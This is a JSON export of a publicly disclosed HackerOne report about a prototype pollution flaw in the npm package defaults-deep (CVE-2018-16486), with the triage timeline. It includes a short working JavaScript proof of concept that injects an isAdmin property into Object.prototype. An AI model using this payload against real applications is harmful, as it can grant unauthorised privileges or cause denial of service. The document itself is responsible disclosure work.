{"id":380878,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODA4Nzg=","url":"https://hackerone.com/reports/380878","title":"Prototype pollution attack (defaults-deep / constructor.prototype)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-07-12T08:43:07.767Z","submitted_at":"2018-07-12T08:43:07.767Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"asgerf","url":"/asgerf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-16486"],"singular_disclosure_disabled":false,"disclosed_at":"2018-09-28T10:03:21.371Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-08-29T10:03:14.631Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a prototype pollution vulnerability in defaults-deep.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** defaults-deep\n**version:** 0.2.4\n**npm page:** `https://www.npmjs.com/package/defaults-deep`\n\n## Module Description\n\nLike `extend` but recursively copies only the missing properties/values to the target object.\n\n## Module Stats\n\n6,659 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nThis is a variant of this vulnerability:\nhttps://hackerone.com/reports/310443\n\nThe `defaults-deep` package can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n\nCraft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:\n\n```javascript\nvar defaultsDeep = require('defaults-deep');\nvar payload = JSON.parse('{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}');\ndefaultsDeep({}, payload);\nconsole.log({}.isAdmin); // true\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nDenial of service, possibly more depending on the application.\nSee https://hackerone.com/reports/310443","vulnerability_information_html":"\u003cp\u003eI would like to report a prototype pollution vulnerability in defaults-deep.\u003cbr\u003e\nIt allows an attacker to inject properties on Object.prototype.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e defaults-deep\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.2.4\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/defaults-deep\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eLike \u003ccode\u003eextend\u003c/code\u003e but recursively copies only the missing properties/values to the target object.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e6,659 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThis is a variant of this vulnerability:\u003cbr\u003e\n\u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003edefaults-deep\u003c/code\u003e package can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eCraft an object of form \u003ccode\u003e{constructor: {prototype: {...}}}\u003c/code\u003e and send it to \u003ccode\u003edefaults-deep\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003edefaultsDeep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003edefaults-deep\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e{\u0026quot;constructor\u0026quot;: {\u0026quot;prototype\u0026quot;: {\u0026quot;isAdmin\u0026quot;: true}}}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003edefaultsDeep\u003c/span\u003e\u003cspan class=\"p\"\u003e({},\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisAdmin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of service, possibly more depending on the application.\u003cbr\u003e\nSee \u003ca title=\"https://hackerone.com/reports/310443\" href=\"https://hackerone.com/reports/310443\"\u003ehttps://hackerone.com/reports/310443\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-09-28T10:03:14.825Z","allow_singular_disclosure_after":-71091817.16553187,"singular_disclosure_allowed":true,"vote_count":7,"voters":["sameerphad72","mygf","eveeez","apapedulimu","cryptographer","demon_boy","jatacheers"],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":6067,"asset_type":"SOURCE_CODE","asset_identifier":"defaults-deep","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3037128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2018-07-13T06:10:33.378Z","updated_at":"2018-07-13T06:10:33.378Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":3037360,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @asgerf,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi @asgerf,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-13T07:58:30.619Z","updated_at":"2018-07-13T07:58:30.619Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3038178,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-13T08:42:48.250Z","updated_at":"2018-07-13T08:42:48.250Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3057373,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-17T13:33:56.916Z","updated_at":"2018-07-17T13:33:56.916Z","actor":{"username":"jonschlinkert","cleared":false,"url":"/jonschlinkert","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3146316,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jonschlinkert do you have time to take a look at this?","markdown_message":"\u003cp\u003e\u003ca href=\"/jonschlinkert\"\u003e@jonschlinkert\u003c/a\u003e do you have time to take a look at this?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-06T06:45:41.617Z","updated_at":"2018-08-06T06:45:41.617Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263136,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I am going to close this one. The report is over 45 days old with no meaningful contribution from the package maintainer. ","markdown_message":"\u003cp\u003eI am going to close this one. The report is over 45 days old with no meaningful contribution from the package maintainer. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T10:03:05.816Z","updated_at":"2018-08-29T10:03:05.816Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"asgerf","url":"/asgerf"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263137,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-29T10:03:14.665Z","updated_at":"2018-08-29T10:03:14.665Z","first_to_agree":true,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3400765,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-28T10:03:21.396Z","updated_at":"2018-09-28T10:03:21.396Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3921280,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE requested https://hackerone.com/nodejs-ecosystem/cve_requests/1244","markdown_message":"\u003cp\u003eCVE requested \u003ca title=\"https://hackerone.com/nodejs-ecosystem/cve_requests/1244\" href=\"https://hackerone.com/nodejs-ecosystem/cve_requests/1244\"\u003ehttps://hackerone.com/nodejs-ecosystem/cve_requests/1244\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T18:30:05.036Z","updated_at":"2019-01-03T18:30:05.036Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4095669,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-05T10:58:29.195Z","updated_at":"2019-02-05T10:58:29.195Z","additional_data":{"old_severity":"Low","new_severity":"Medium (6.1)","old_severity_id":182260,"new_severity_id":292237},"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":10058,"category":"team","content":"The vulnerability was reported and verified. \nThe package maintainer joined the report but never participated or published a patch.\nAfter 45+ days the report was disclosed.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe vulnerability was reported and verified. \u003cbr\u003e\nThe package maintainer joined the report but never participated or published a patch.\u003cbr\u003e\nAfter 45+ days the report was disclosed.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}